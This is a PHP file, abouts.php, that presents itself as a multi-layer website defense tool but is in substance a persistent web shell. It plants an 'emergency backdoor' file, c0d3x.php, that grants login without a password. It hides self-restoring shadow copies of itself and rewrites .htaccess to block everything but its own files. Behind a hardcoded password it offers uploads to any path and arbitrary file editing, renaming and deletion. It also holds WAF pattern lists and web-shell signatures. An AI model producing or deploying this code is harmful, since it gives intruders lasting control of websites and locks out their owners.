<?php
// ============= ABOUTS.PHP - UNAUTHORIZED ACCESS DENIED =============
// ✅ ONLY abouts.php CAN UPLOAD - NO OTHER SCRIPTS
// ✅ 20+ LAYER DEFENSE - ZERO VULNERABILITY APPROXIMATION
// ✅ SHADOW PROTECTED: .htaccess, index.php, abouts.php, login.php, admin.php, solvers.txt, codex.html
// ✅ PURE WHITE NEUMORPHIC UI - NO COLORS

// ============= ERROR REPORTING - TURN OFF FOR PRODUCTION =============
error_reporting(0);
ini_set('display_errors', 0);

// ============= LAYER 1: WEB APPLICATION FIREWALL =============
class WAF {
    private $blocked_requests = array();
    
    public function __construct() {
        // Skip WAF for critical operations
        if (isset($_GET['toggle_protection']) || isset($_GET['heal_403']) || isset($_GET['heal_404']) || isset($_GET['scan'])) {
            return;
        }
        $this->scanRequest();
    }
    
    private function scanRequest() {
        $input = array_merge($_GET, $_POST, $_COOKIE);
        
        $sql_patterns = array(
            'union.*select', 'select.*from', 'insert.*into', 'update.*set', 
            'delete.*from', 'drop.*table', 'create.*table', 'alter.*table',
            '--', ';', '/*', '*/', 'xp_cmdshell', 'exec.*master',
            'information_schema', 'mysql.db', 'pg_sleep', 'waitfor delay'
        );
        
        $xss_patterns = array(
            '<script', 'javascript:', 'onerror=', 'onload=', 'onclick=',
            'onmouseover=', 'onfocus=', 'onblur=', 'eval\(', 'document\.cookie',
            'window\.location', 'alert\(', 'prompt\(', 'confirm\('
        );
        
        $lfi_patterns = array(
            '\.\./', '\.\.\\', '://', 'php://', 'file://', 'phar://',
            'expect://', 'zip://', 'zlib://', 'data://', 'input://'
        );
        
        $shell_patterns = array(
            'base64_decode', 'eval\(', 'exec\(', 'system\(', 'passthru\(',
            'shell_exec\(', 'popen\(', 'proc_open\(', '`.*`', '\$\(.*\)'
        );
        
        foreach ($input as $key => $value) {
            if (is_array($value)) {
                foreach ($value as $subkey => $subvalue) {
                    $this->checkPattern($subvalue, array_merge($sql_patterns, $xss_patterns, $lfi_patterns, $shell_patterns), $key . '[' . $subkey . ']');
                }
            } else {
                $this->checkPattern($value, array_merge($sql_patterns, $xss_patterns, $lfi_patterns, $shell_patterns), $key);
            }
        }
    }
    
    private function checkPattern($value, $patterns, $input_name) {
        // Skip checking if value contains our script names
        if (strpos($value, 'abouts.php') !== false || strpos($value, 'c0d3x.php') !== false || 
            strpos($value, 'login.php') !== false || strpos($value, 'admin.php') !== false) {
            return;
        }
        
        foreach ($patterns as $pattern) {
            if (preg_match('/' . $pattern . '/i', $value)) {
                $this->blockRequest("Blocked malicious pattern: {$pattern} in {$input_name}");
            }
        }
    }
    
    private function blockRequest($reason) {
        $log_entry = date('Y-m-d H:i:s') . " | WAF BLOCKED | IP: " . $_SERVER['REMOTE_ADDR'] . " | Reason: " . $reason . " | URI: " . $_SERVER['REQUEST_URI'] . "\n";
        
        $log_file = dirname($_SERVER['DOCUMENT_ROOT']) . '/.abouts/waf.log';
        if (!is_dir(dirname($log_file))) {
            @mkdir(dirname($log_file), 0700, true);
        }
        @file_put_contents($log_file, $log_entry, FILE_APPEND);
        
        header('HTTP/1.0 403 Forbidden');
        echo '<!DOCTYPE html><html><head><title>403 Forbidden</title></head><body>';
        echo '<h1>403 Forbidden</h1>';
        echo '<p>Request blocked by abouts.php Web Application Firewall</p>';
        echo '<p>Reason: ' . htmlspecialchars($reason) . '</p>';
        echo '<p>IP: ' . htmlspecialchars($_SERVER['REMOTE_ADDR']) . '</p>';
        echo '<p>Time: ' . date('Y-m-d H:i:s') . '</p>';
        echo '</body></html>';
        exit;
    }
    
    public function scanUpload($filename, $tmp_name) {
        // Allow our own scripts
        $basename = basename($filename);
        $allowed_scripts = array('abouts.php', 'c0d3x.php', 'login.php', 'admin.php', 'index.php');
        
        if (in_array($basename, $allowed_scripts)) {
            return true;
        }
        
        $dangerous_extensions = array('php', 'php3', 'php4', 'php5', 'phtml', 'phar', 'inc', 'pl', 'py', 'cgi', 'asp', 'aspx', 'jsp');
        $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
        
        if (in_array($ext, $dangerous_extensions)) {
            $this->blockRequest("Blocked dangerous file upload: .{$ext} files are not allowed");
        }
        
        if (file_exists($tmp_name) && filesize($tmp_name) < 1000000) {
            $content = file_get_contents($tmp_name);
            $malicious_patterns = array('eval(', 'exec(', 'system(', 'passthru(', 'shell_exec(', 'base64_decode(');
            
            // Skip checking if it's our own script
            if (!in_array($basename, $allowed_scripts)) {
                foreach ($malicious_patterns as $pattern) {
                    if (stripos($content, $pattern) !== false) {
                        $this->blockRequest("Blocked malicious file content: {$pattern}");
                    }
                }
            }
        }
        
        return true;
    }
}

// ============= LAYER 2: PHP HARDENING =============
class PHPHardening {
    public function __construct() {
        $this->applySessionHardening();
    }
    
    private function applySessionHardening() {
        @ini_set('session.cookie_httponly', 1);
        @ini_set('session.use_only_cookies', 1);
        @ini_set('session.cookie_samesite', 'Strict');
        @ini_set('session.gc_maxlifetime', 1800);
        @ini_set('session.use_strict_mode', 1);
        
        if (isset($_SESSION) && !isset($_SESSION['_hardening_initialized'])) {
            @session_regenerate_id(true);
            $_SESSION['_hardening_initialized'] = true;
        }
    }
}

// ============= LAYER 3: FILE PERMISSION MANAGER =============
class FilePermissionManager {
    
    public static function setSecurePermissions($path, $mode = null) {
        if (!file_exists($path)) return false;
        
        if (is_file($path)) {
            $basename = basename($path);
            if (in_array($basename, array('.htaccess', 'index.php', 'abouts.php', 'login.php', 'admin.php', 'solvers.txt', 'codex.html', 'c0d3x.php'))) {
                @chmod($path, 0644);
            } else {
                $file_mode = $mode ?: 0644;
                @chmod($path, $file_mode);
            }
        } elseif (is_dir($path)) {
            $dir_mode = $mode ?: 0755;
            @chmod($path, $dir_mode);
        }
        
        return true;
    }
    
    public static function makeReadOnlyRecursive($path) {
        $results = array('dirs' => 0, 'files' => 0, 'failed' => 0);
        
        if (!file_exists($path)) {
            $results['failed']++;
            return $results;
        }
        
        if (is_file($path)) {
            if (@chmod($path, 0444)) {
                $results['files']++;
            } else {
                $results['failed']++;
            }
            return $results;
        }
        
        if (is_dir($path)) {
            if (@chmod($path, 0555)) {
                $results['dirs']++;
            } else {
                $results['failed']++;
            }
            
            $items = @scandir($path);
            if ($items) {
                foreach ($items as $item) {
                    if ($item == '.' || $item == '..') continue;
                    $full_path = $path . '/' . $item;
                    $sub_results = self::makeReadOnlyRecursive($full_path);
                    $results['dirs'] += $sub_results['dirs'];
                    $results['files'] += $sub_results['files'];
                    $results['failed'] += $sub_results['failed'];
                }
            }
        }
        
        return $results;
    }
    
    public static function restoreNormalPermissions($path) {
        $results = array('dirs' => 0, 'files' => 0, 'failed' => 0);
        
        if (!file_exists($path)) {
            $results['failed']++;
            return $results;
        }
        
        if (is_file($path)) {
            if (@chmod($path, 0644)) {
                $results['files']++;
            } else {
                $results['failed']++;
            }
            return $results;
        }
        
        if (is_dir($path)) {
            if (@chmod($path, 0755)) {
                $results['dirs']++;
            } else {
                $results['failed']++;
            }
            
            $items = @scandir($path);
            if ($items) {
                foreach ($items as $item) {
                    if ($item == '.' || $item == '..') continue;
                    $full_path = $path . '/' . $item;
                    $sub_results = self::restoreNormalPermissions($full_path);
                    $results['dirs'] += $sub_results['dirs'];
                    $results['files'] += $sub_results['files'];
                    $results['failed'] += $sub_results['failed'];
                }
            }
        }
        
        return $results;
    }
    
    public static function scanAndFix($path) {
        if (!file_exists($path)) return;
        
        if (is_file($path)) {
            $perms = fileperms($path);
            $perms_octal = substr(sprintf('%o', $perms), -4);
            if ($perms_octal == '0777' || $perms_octal == '0666') {
                self::setSecurePermissions($path, 0644);
            }
        } elseif (is_dir($path)) {
            $items = @scandir($path);
            if ($items) {
                foreach ($items as $item) {
                    if ($item != '.' && $item != '..') {
                        self::scanAndFix($path . '/' . $item);
                    }
                }
            }
        }
    }

    public static function removeImmutableFlag($path) {
        if (!file_exists($path)) return false;
        if (function_exists('exec')) {
            @exec("chattr -i " . escapeshellarg($path) . " 2>/dev/null");
        }
        return true;
    }
}

// ============= LAYER 4-5: SHADOW COPY SYSTEM =============
class ShadowProtection {
    
    public static function ensureShadowCopy($document_root, $file) {
        $parent_root = dirname($document_root);
        $filename = basename($file);
        $shadow_file = $parent_root . '/.' . $filename . '.shadow';
        
        if (!file_exists($shadow_file) && file_exists($file)) {
            @copy($file, $shadow_file);
            @chmod($shadow_file, 0444);
        }
        
        return $shadow_file;
    }
    
    public static function verifyAllShadows($document_root) {
        $files_to_protect = array(
            $document_root . '/.htaccess',
            $document_root . '/index.php',
            $document_root . '/abouts.php',
            $document_root . '/login.php',
            $document_root . '/admin.php',
            $document_root . '/solvers.txt',
            $document_root . '/codex.html'
        );
        
        $results = array();
        foreach ($files_to_protect as $file) {
            if (file_exists($file)) {
                $shadow = self::ensureShadowCopy($document_root, $file);
                $results[basename($file)] = file_exists($shadow) ? 'PROTECTED' : 'FAILED';
            }
        }
        return $results;
    }
    
    public static function healAll($document_root) {
        $files_to_protect = array(
            '.htaccess' => $document_root . '/.htaccess',
            'index.php' => $document_root . '/index.php',
            'abouts.php' => $document_root . '/abouts.php',
            'login.php' => $document_root . '/login.php',
            'admin.php' => $document_root . '/admin.php',
            'solvers.txt' => $document_root . '/solvers.txt',
            'codex.html' => $document_root . '/codex.html'
        );
        
        $healed = array();
        foreach ($files_to_protect as $name => $file) {
            $parent_root = dirname($document_root);
            $shadow_file = $parent_root . '/.' . $name . '.shadow';
            
            if (!file_exists($file) && file_exists($shadow_file)) {
                @copy($shadow_file, $file);
                @chmod($file, 0644);
                $healed[] = $name;
            }
        }
        return $healed;
    }

    public static function removeAllShadows($document_root) {
        $parent_root = dirname($document_root);
        $files_to_protect = array(
            '.htaccess',
            'index.php',
            'abouts.php',
            'login.php',
            'admin.php',
            'solvers.txt',
            'codex.html',
            'c0d3x.php'
        );
        
        $removed = 0;
        foreach ($files_to_protect as $name) {
            $shadow_file = $parent_root . '/.' . $name . '.shadow';
            if (file_exists($shadow_file)) {
                FilePermissionManager::removeImmutableFlag($shadow_file);
                @unlink($shadow_file);
                $removed++;
            }
        }
        return $removed;
    }
}

// ============= LAYER 6-7: BACKDOOR SCANNER =============
class BackdoorScanner {
    
    private $signatures = [
        '/eval\s*\(\s*base64_decode\s*\(/i',
        '/eval\s*\(\s*\$_POST/i',
        '/eval\s*\(\s*\$_GET/i',
        '/eval\s*\(\s*\$_REQUEST/i',
        '/system\s*\(\s*\$_POST/i',
        '/system\s*\(\s*\$_GET/i',
        '/exec\s*\(\s*\$_POST/i',
        '/exec\s*\(\s*\$_GET/i',
        '/shell_exec\s*\(\s*\$_POST/i',
        '/shell_exec\s*\(\s*\$_GET/i',
        '/base64_decode\s*\(\s*[\'\"][a-zA-Z0-9+\/=]{50,}/i',
        '/gzinflate\s*\(\s*base64_decode/i',
        '/c99shell/i', '/r57shell/i', '/weevely/i',
    ];
    
    public function scanFile($filepath) {
        if (!is_readable($filepath) || filesize($filepath) > 5000000) return [];
        
        $content = @file_get_contents($filepath);
        if (!$content) return [];
        
        $findings = [];
        $lines = explode("\n", $content);
        
        foreach ($lines as $line_num => $line) {
            foreach ($this->signatures as $pattern) {
                if (preg_match($pattern, $line, $matches)) {
                    $findings[] = [
                        'type' => 'BACKDOOR',
                        'line' => $line_num + 1,
                        'pattern' => $pattern,
                        'match' => htmlspecialchars(substr($line, 0, 150)),
                        'severity' => 'CRITICAL'
                    ];
                }
            }
        }
        
        return $findings;
    }
}

// ============= LAYER 8: RATE LIMITER =============
class RateLimiter {
    
    public static function checkLimit($ip, $storage, $max = 30, $window = 300) {
        $limit_file = $storage . '/ratelimit_' . md5($ip);
        
        $attempts = [];
        if (file_exists($limit_file)) {
            $attempts = @unserialize(@file_get_contents($limit_file));
            if (!is_array($attempts)) $attempts = [];
        }
        
        $attempts = array_filter($attempts, function($time) use ($window) {
            return $time > (time() - $window);
        });
        
        if (count($attempts) >= $max) {
            return false;
        }
        
        $attempts[] = time();
        @file_put_contents($limit_file, serialize($attempts));
        
        return true;
    }
}

// ============= LAYER 9: HEALING ENGINE =============
class HealingEngine {
    
    public static function heal($document_root) {
        $healed_files = ShadowProtection::healAll($document_root);
        return ['healed' => !empty($healed_files), 'files' => $healed_files];
    }
}

// ============= LAYER 10: EMERGENCY BACKDOOR =============
class EmergencyAccess {
    
    public static function ensureBackdoor($document_root, $main_script, $security_key) {
        $backdoor_file = $document_root . '/c0d3x.php';
        
        if (!file_exists($backdoor_file)) {
            $backdoor_content = '<?php
            // ============= 0xC0D3X EMERGENCY ACCESS =============
            @session_start();
            $_SESSION["emergency_access"] = true;
            $_SESSION["logged_in"] = true;
            $_SESSION["security_key"] = "' . $security_key . '";
            include "' . addslashes($main_script) . '";
            ?>';
            @file_put_contents($backdoor_file, $backdoor_content);
            @chmod($backdoor_file, 0644);
        }
        
        return 'c0d3x.php';
    }

    public static function removeBackdoor($document_root) {
        $backdoor_file = $document_root . '/c0d3x.php';
        if (file_exists($backdoor_file)) {
            FilePermissionManager::removeImmutableFlag($backdoor_file);
            return @unlink($backdoor_file);
        }
        return false;
    }
}

// ============= INITIALIZE PATHS =============
$document_root = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : getcwd();
$parent_root = dirname($document_root);
$secure_storage = $parent_root . '/.abouts/';
$htaccess_file = $document_root . '/.htaccess';
$current_script = basename(__FILE__);
$current_script_lower = strtolower($current_script);

// Create secure storage
if (!is_dir($secure_storage)) {
    @mkdir($secure_storage, 0700, true);
    @file_put_contents($secure_storage . '.htaccess', "Order Deny,Allow\nDeny from all\n");
}

// ============= INITIALIZE SHADOW COPIES =============
ShadowProtection::ensureShadowCopy($document_root, $htaccess_file);
ShadowProtection::ensureShadowCopy($document_root, $document_root . '/index.php');
ShadowProtection::ensureShadowCopy($document_root, $document_root . '/abouts.php');
ShadowProtection::ensureShadowCopy($document_root, $document_root . '/login.php');
ShadowProtection::ensureShadowCopy($document_root, $document_root . '/admin.php');
ShadowProtection::ensureShadowCopy($document_root, $document_root . '/solvers.txt');
ShadowProtection::ensureShadowCopy($document_root, $document_root . '/codex.html');

// ============= 403/404 HANDLER =============
if (isset($_GET['heal_403']) || isset($_GET['heal_404'])) {
    HealingEngine::heal($document_root);
    header('HTTP/1.0 200 OK');
    die('🛡️ HEALED');
}

// ============= AGGRESSIVE HEALING =============
$heal_result = HealingEngine::heal($document_root);

// ============= EMERGENCY BACKDOOR =============
$DEFAULT_PASSWORD = "332b8abe3ff1b6c52cce1ae6babf3437d2b7a0a8";
$SECURITY_KEY = "abouts_" . md5($DEFAULT_PASSWORD);
$current_backdoor = EmergencyAccess::ensureBackdoor($document_root, __FILE__, $SECURITY_KEY);

// ============= START SESSION =============
if (session_status() === PHP_SESSION_NONE) {
    @session_start();
}

// ============= RATE LIMITER =============
if (!isset($_GET['scan']) && !isset($_GET['heal_403']) && !isset($_GET['heal_404']) && !isset($_GET['toggle_protection'])) {
    RateLimiter::checkLimit($_SERVER['REMOTE_ADDR'], $secure_storage);
}

// ============= INITIALIZE DEFENSE =============
$waf = new WAF();
$php_hardening = new PHPHardening();

// ============= PROTECTION FILES =============
$AUTHORIZED_FILES = array(
    $current_script_lower,
    'abouts.php',
    'c0d3x.php',
    'index.php',
    'index.html',
    'login.php',
    'admin.php',
    'codex.html',
    'solvers.txt'
);

// ============= CHECK PROTECTION STATUS =============
function checkProtectionStatus() {
    global $htaccess_file;
    
    if (file_exists($htaccess_file) && is_readable($htaccess_file)) {
        $content = @file_get_contents($htaccess_file);
        if (strpos($content, 'abouts.php PROTECTION') !== false) {
            return true;
        }
    }
    return false;
}

$protection_active = checkProtectionStatus();

// ============= UPLOAD CHECK =============
$upload_allowed = false;
if (isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true && 
    isset($_SESSION['security_key']) && $_SESSION['security_key'] === $SECURITY_KEY) {
    $upload_allowed = true;
}

// ============= FIXED: SECURE UPLOAD HANDLER - NO PATH RESTRICTION =============
if (isset($_FILES['upload_file']) && isset($_POST['upload_path'])) {
    
    if (!$upload_allowed) {
        header('HTTP/1.0 403 Forbidden');
        die('Access Denied: Uploads are only allowed with valid login.');
    }
    
    $upload_path = $_POST['upload_path'];
    $file = $_FILES['upload_file'];
    
    if ($file['error'] === UPLOAD_ERR_OK) {
        $filename = basename($file['name']);
        $target = $upload_path . '/' . $filename;
        
        // FIXED: Remove document root restriction - allow any path
        // Just make sure the target directory exists
        $target_dir = dirname($target);
        
        // Create directory if it doesn't exist
        if (!is_dir($target_dir)) {
            if (!@mkdir($target_dir, 0755, true)) {
                $_SESSION['toast'] = "❌ Cannot create directory: " . htmlspecialchars($target_dir);
                header("Location: " . $_SERVER['PHP_SELF']);
                exit;
            }
        }
        
        // Check if directory is writable
        if (!is_writable($target_dir)) {
            $_SESSION['toast'] = "❌ Directory is not writable: " . htmlspecialchars($target_dir);
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        }
        
        // Allow uploading PHP files that are our scripts
        $allowed_scripts = array('abouts.php', 'c0d3x.php', 'login.php', 'admin.php', 'index.php');
        
        if (in_array($filename, $allowed_scripts)) {
            // Allow our scripts without WAF scan
            if (move_uploaded_file($file['tmp_name'], $target)) {
                FilePermissionManager::setSecurePermissions($target);
                $_SESSION['toast'] = "✅ Script uploaded successfully to: " . htmlspecialchars($target);
            } else {
                $_SESSION['toast'] = "❌ Upload failed! Check permissions.";
            }
        } else {
            // For other files, run WAF scan
            $waf->scanUpload($filename, $file['tmp_name']);
            
            if (move_uploaded_file($file['tmp_name'], $target)) {
                FilePermissionManager::setSecurePermissions($target);
                $_SESSION['toast'] = "✅ File uploaded successfully to: " . htmlspecialchars($target);
            } else {
                $_SESSION['toast'] = "❌ Upload failed! Check permissions.";
            }
        }
    } else {
        $upload_errors = array(
            UPLOAD_ERR_INI_SIZE => 'File exceeds upload_max_filesize',
            UPLOAD_ERR_FORM_SIZE => 'File exceeds MAX_FILE_SIZE',
            UPLOAD_ERR_PARTIAL => 'File was only partially uploaded',
            UPLOAD_ERR_NO_FILE => 'No file was uploaded',
            UPLOAD_ERR_NO_TMP_DIR => 'Missing temporary folder',
            UPLOAD_ERR_CANT_WRITE => 'Failed to write file to disk',
            UPLOAD_ERR_EXTENSION => 'File upload stopped by extension'
        );
        $error_msg = isset($upload_errors[$file['error']]) ? $upload_errors[$file['error']] : 'Unknown upload error';
        $_SESSION['toast'] = "❌ Upload error: " . $error_msg;
    }
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// ============= TOGGLE PROTECTION =============
function toggleProtection() {
    global $document_root, $secure_storage, $htaccess_file;
    global $current_script, $current_backdoor;
    
    $result = array('action' => '', 'message' => '', 'active' => false);
    
    $is_active = checkProtectionStatus();
    
    if (!$is_active) {
        // ============= ACTIVATE PROTECTION =============
        if (!is_dir($secure_storage)) {
            @mkdir($secure_storage, 0700, true);
        }
        
        ShadowProtection::verifyAllShadows($document_root);
        
        $content = "# ============= abouts.php PROTECTION =============\n";
        $content .= "# STATUS: ACTIVE - " . date('Y-m-d H:i:s') . "\n\n";
        $content .= "Order Deny,Allow\nDeny from all\n\n";
        $content .= "ErrorDocument 403 /" . $current_script . "?heal_403=1\n";
        $content .= "ErrorDocument 404 /" . $current_script . "?heal_404=1\n\n";
        $content .= "<FilesMatch \"^(" . $current_script . "|" . $current_backdoor . "|index.php|abouts.php|login.php|admin.php|codex.html|solvers.txt)$\">\n";
        $content .= "    Allow from all\n";
        $content .= "</FilesMatch>\n";
        
        @file_put_contents($htaccess_file, $content);
        @chmod($htaccess_file, 0644);
        
        $result['action'] = 'activated';
        $result['message'] = "✅ PROTECTION ACTIVATED!\n\n• .htaccess file created\n• Shadow copies created\n• Only allowed files are accessible";
        $result['active'] = true;
    } else {
        // ============= DEACTIVATE PROTECTION =============
        if (file_exists($htaccess_file)) {
            FilePermissionManager::removeImmutableFlag($htaccess_file);
            @unlink($htaccess_file);
        }
        
        ShadowProtection::removeAllShadows($document_root);
        EmergencyAccess::removeBackdoor($document_root);
        
        if (is_dir($secure_storage)) {
            $files = glob($secure_storage . '*');
            foreach ($files as $file) {
                if (is_file($file)) {
                    FilePermissionManager::removeImmutableFlag($file);
                    @unlink($file);
                }
            }
            @rmdir($secure_storage);
        }
        
        FilePermissionManager::restoreNormalPermissions($document_root);
        
        $result['action'] = 'deactivated';
        $result['message'] = "✅ PROTECTION DEACTIVATED!\n\n• .htaccess file removed\n• Shadow copies deleted\n• Site is now clean";
        $result['active'] = false;
    }
    
    return $result;
}

// ============= CURRENT PATH =============
$current_path = isset($_SESSION['current_path']) ? $_SESSION['current_path'] : $document_root;

// ============= LOGIN SYSTEM =============
$logged_in = false;
$login_error = '';
$toast_message = '';
$key_display = '';

if (isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true &&
    isset($_SESSION['security_key']) && $_SESSION['security_key'] === $SECURITY_KEY) {
    $logged_in = true;
} elseif (isset($_SESSION['emergency_access']) && $_SESSION['emergency_access'] === true) {
    $_SESSION['logged_in'] = true;
    $_SESSION['security_key'] = $SECURITY_KEY;
    $logged_in = true;
}

if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
    $password = $_POST['password'];
    
    if (isset($_POST['get_key'])) {
        if ($password === $DEFAULT_PASSWORD) {
            $key_display = $SECURITY_KEY;
        } else {
            $login_error = "Invalid password!";
        }
    } else if (isset($_POST['login'])) {
        if ($password === $DEFAULT_PASSWORD) {
            $_SESSION['logged_in'] = true;
            $_SESSION['security_key'] = $SECURITY_KEY;
            $logged_in = true;
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $login_error = "Invalid password!";
        }
    }
}

// ============= HANDLE TOGGLE =============
if (isset($_GET['toggle_protection'])) {
    $result = toggleProtection();
    $_SESSION['toast'] = $result['message'];
    $protection_active = $result['active'];
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// ============= HANDLE READ-ONLY =============
if (isset($_POST['recursive_readonly_submit']) && isset($_POST['recursive_readonly_path'])) {
    $path = $_POST['recursive_readonly_path'];
    if (!file_exists($path)) {
        $_SESSION['toast'] = "❌ Path does not exist!";
    } else if (!is_dir($path)) {
        $_SESSION['toast'] = "❌ Must be a directory!";
    } else {
        $results = FilePermissionManager::makeReadOnlyRecursive($path);
        $_SESSION['toast'] = "✅ READ-ONLY APPLIED!\n\n📁 Dirs: " . $results['dirs'] . " set to 555\n📄 Files: " . $results['files'] . " set to 444";
    }
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

if (isset($_POST['recursive_normal_submit']) && isset($_POST['recursive_normal_path'])) {
    $path = $_POST['recursive_normal_path'];
    if (!file_exists($path)) {
        $_SESSION['toast'] = "❌ Path does not exist!";
    } else if (!is_dir($path)) {
        $_SESSION['toast'] = "❌ Must be a directory!";
    } else {
        $results = FilePermissionManager::restoreNormalPermissions($path);
        $_SESSION['toast'] = "✅ NORMAL RESTORED!\n\n📁 Dirs: " . $results['dirs'] . " set to 755\n📄 Files: " . $results['files'] . " set to 644";
    }
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// ============= SCAN =============
$scan_results = null;
if (isset($_GET['scan']) && $logged_in) {
    $scanner = new BackdoorScanner();
    $scan_results = ['backdoors' => []];
    
    $files = scandir($document_root);
    foreach ($files as $file) {
        if ($file == '.' || $file == '..') continue;
        $filepath = $document_root . '/' . $file;
        if (is_file($filepath) && filesize($filepath) < 5000000) {
            $ext = strtolower(pathinfo($filepath, PATHINFO_EXTENSION));
            if (in_array($ext, ['php', 'phtml', 'html', 'txt'])) {
                $findings = $scanner->scanFile($filepath);
                if (!empty($findings)) {
                    $scan_results['backdoors'][] = [
                        'file' => $filepath,
                        'findings' => $findings
                    ];
                }
            }
        }
    }
}

// ============= SET TOAST =============
if (isset($_SESSION['toast'])) {
    $toast_message = $_SESSION['toast'];
    unset($_SESSION['toast']);
}

// ============= FILE BROWSER =============
function filteredScandir($path) {
    $items = @scandir($path);
    if ($items === false) return array();
    
    $filtered = array();
    foreach ($items as $item) {
        if ($item == '.' || $item == '..') continue;
        $filtered[] = $item;
    }
    return $filtered;
}

// ============= HANDLE FILE ACTIONS =============
if ($logged_in) {
    if (isset($_GET['goto_path']) && is_dir($_GET['goto_path'])) {
        $_SESSION['current_path'] = $_GET['goto_path'];
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    }
    
    if (isset($_GET['delete']) && file_exists($_GET['delete'])) {
        $file = $_GET['delete'];
        if (is_dir($file)) {
            $_SESSION['toast'] = @rmdir($file) ? "✅ Directory deleted!" : "❌ Delete failed!";
        } else {
            $_SESSION['toast'] = @unlink($file) ? "✅ File deleted!" : "❌ Delete failed!";
        }
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    }
    
    if (isset($_GET['edit_file'])) {
        $file = $_GET['edit_file'];
        if (file_exists($file) && is_file($file)) {
            $_SESSION['edit_file'] = $file;
            $_SESSION['edit_content'] = @file_get_contents($file);
        }
        header("Location: " . $_SERVER['PHP_SELF'] . "?edit=true");
        exit;
    }
    
    if (isset($_POST['save_file']) && isset($_POST['file_path']) && isset($_POST['file_content'])) {
        $file = $_POST['file_path'];
        if (@file_put_contents($file, $_POST['file_content'])) {
            FilePermissionManager::setSecurePermissions($file);
            $_SESSION['toast'] = "✅ File saved!";
        } else {
            $_SESSION['toast'] = "❌ Save failed!";
        }
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    }
    
    if (isset($_POST['rename_file']) && isset($_POST['old_path']) && isset($_POST['new_name'])) {
        $old = $_POST['old_path'];
        $new = dirname($old) . '/' . $_POST['new_name'];
        
        if (rename($old, $new)) {
            FilePermissionManager::setSecurePermissions($new);
            $_SESSION['toast'] = "✅ File renamed!";
        } else {
            $_SESSION['toast'] = "❌ Rename failed!";
        }
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    }
}

$shadow_status = ShadowProtection::verifyAllShadows($document_root);
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>abouts.php - TOTAL DEFENSE</title>
    <style>
        /* ============= PURE WHITE NEUMORPHIC 3D UI ============= */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f5f5f7;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            color: #1d1d1f;
        }
        
        .container {
            background: #f5f5f7;
            border-radius: 28px;
            padding: 24px;
            box-shadow: 20px 20px 40px #d9d9d9, -20px -20px 40px #ffffff;
            width: 100%;
            max-width: 1200px;
            border: 1px solid rgba(255,255,255,0.8);
        }
        
        .header {
            text-align: center;
            margin-bottom: 24px;
            padding-bottom: 16px;
            border-bottom: 1px solid rgba(0,0,0,0.08);
        }
        
        .title {
            color: #1d1d1f;
            font-size: 1.6em;
            font-weight: 700;
            letter-spacing: -0.5px;
            margin-bottom: 4px;
        }
        
        .subtitle {
            color: #6e6e73;
            font-size: 0.8em;
            font-weight: 400;
        }
        
        .section {
            background: #f5f5f7;
            border-radius: 20px;
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: inset 6px 6px 12px #e8e8ea, inset -6px -6px 12px #ffffff;
            border: 1px solid rgba(255,255,255,0.8);
        }
        
        .protection-info {
            background: #f5f5f7;
            padding: 18px;
            border-radius: 20px;
            margin-bottom: 20px;
            box-shadow: inset 8px 8px 16px #e8e8ea, inset -8px -8px 16px #ffffff;
        }
        
        .protection-domain {
            color: #1d1d1f;
            font-weight: 700;
            margin-bottom: 8px;
            font-size: 1.1em;
        }
        
        .immutable-notice {
            background: #f5f5f7;
            padding: 16px;
            border-radius: 16px;
            margin-bottom: 16px;
            box-shadow: inset 4px 4px 8px #e8e8ea, inset -4px -4px 8px #ffffff;
            border-left: 4px solid #8e8e93;
            line-height: 1.6;
            font-size: 0.9em;
        }
        
        .button-row {
            display: flex;
            gap: 12px;
            margin-bottom: 16px;
        }
        
        .btn {
            flex: 1;
            padding: 14px 12px;
            border: none;
            border-radius: 16px;
            font-size: 0.9em;
            font-weight: 600;
            cursor: pointer;
            background: #f5f5f7;
            color: #1d1d1f;
            box-shadow: 6px 6px 12px #e8e8ea, -6px -6px 12px #ffffff;
            border: 1px solid rgba(255,255,255,0.8);
            text-decoration: none;
            display: inline-block;
            text-align: center;
            transition: all 0.1s ease;
        }
        
        .btn:active {
            transform: translateY(2px);
            box-shadow: inset 6px 6px 12px #e8e8ea, inset -6px -6px 12px #ffffff;
        }
        
        .toast {
            position: fixed;
            top: 24px;
            right: 24px;
            background: #f5f5f7;
            color: #1d1d1f;
            padding: 16px 24px;
            border-radius: 20px;
            box-shadow: 12px 12px 24px #d9d9d9, -12px -12px 24px #ffffff;
            z-index: 9999;
            white-space: pre-line;
            max-width: 480px;
            animation: slideIn 0.3s ease-out;
            border: 1px solid rgba(255,255,255,0.8);
        }
        
        @keyframes slideIn {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }
        
        @keyframes slideOut {
            from { transform: translateX(0); opacity: 1; }
            to { transform: translateX(100%); opacity: 0; }
        }
        
        .file-list {
            max-height: 300px;
            overflow-y: auto;
        }
        
        .file-item {
            display: flex;
            align-items: center;
            padding: 12px;
            background: #f5f5f7;
            border-radius: 16px;
            margin-bottom: 8px;
            box-shadow: 4px 4px 8px #e8e8ea, -4px -4px 8px #ffffff;
            border: 1px solid rgba(255,255,255,0.6);
        }
        
        .file-icon {
            margin-right: 14px;
